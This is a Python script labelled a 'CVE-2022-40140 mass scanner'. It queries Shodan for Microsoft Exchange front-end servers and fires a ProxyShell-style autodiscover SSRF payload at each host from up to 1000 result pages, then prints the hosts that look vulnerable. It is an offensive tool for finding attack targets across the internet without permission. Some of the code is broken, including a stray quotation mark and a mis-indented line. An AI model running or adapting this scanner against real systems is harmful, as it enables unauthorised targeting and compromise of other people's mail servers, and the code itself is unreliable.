
'''
 /$$                     /$$
|__/                    | $$
 /$$  /$$$$$$   /$$$$$$$| $$$$$$$   /$$$$$$  /$$   /$$ /$$$$$$$   /$$$$$$
| $$ /$$__  $$ /$$_____/| $$__  $$ /$$__  $$| $$  | $$| $$__  $$ /$$__  $$
| $$| $$  \ $$|  $$$$$$ | $$  \ $$| $$  \__/| $$  | $$| $$  \ $$| $$  \ $$
| $$| $$  | $$ \____  $$| $$  | $$| $$      | $$  | $$| $$  | $$| $$  | $$
| $$| $$$$$$$/ /$$$$$$$/| $$$$$$$/| $$      |  $$$$$$/| $$  | $$|  $$$$$$/
|__/| $$____/ |_______/ |_______/ |__/       \______/ |__/  |__/ \______/
    | $$
    | $$
    |__/

CVE-2022-40140 MASS SCANNER
'''


import grequests
import requests
from shodan import Shodan
import uuid
import logging
import urllib3
import urllib
import time
import argparse
from urllib.parse import urlsplit, urlunsplit


api = Shodan('YOU SHODAN API KEY')

payload = "/autodiscover/autodiscover.json?a@foo.var/owa/?&Email=autodiscover/autodiscover.json?a@foo.var&Protocol=XYZ&FooProtocol=Powershell""
dork ="x-feserver"

repeated= []

urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

def do_something(r):
    if r != None and 'x-feserver' in r.headers and (r.status_code not in [401,402,403,404]):
        print(r.url,' VULNERABLE')

def base_url(url, with_path=False):
    parsed = urllib.parse.urlparse(url)
    path   = '/'.join(parsed.path.split('/')[:-1]) if with_path else ''
    parsed = parsed._replace(path=path)
    parsed = parsed._replace(params='')
    parsed = parsed._replace(query='')
    parsed = parsed._replace(fragment='')
    return parsed.geturl()

def main():

    start = 1
    end = 1000 #craft 1000 pagses from shodan
    while start < end:
        results = api.search(dork,page=start)
        urls = []
        for banner in results["matches"]:
            if 'hostnames' in banner:
                for hostname in banner["hostnames"]:
                    if hostname in repeated:
                    continue
                    hostname = (base_url('http://'+hostname)).split("http://")[1]
                    repeated.append(hostname)
                    if banner["port"] != 80:
                        urls.append('http://'+hostname)
                    if banner["port"] != 443:
                        urls.append('https://'+hostname+':443')
                    if banner["port"] != 443 and banner["port"] != 80:
                        urls.append('http://'+hostname+':'+str(banner["port"]))
        rs = (grequests.get(u+payload,allow_redirects=False, timeout=3, verify = 'https' in u) for u in urls)
        results = grequests.map(rs)
        for result in results:
            do_something(result)
        start += 1

if __name__ == '__main__':
    main()
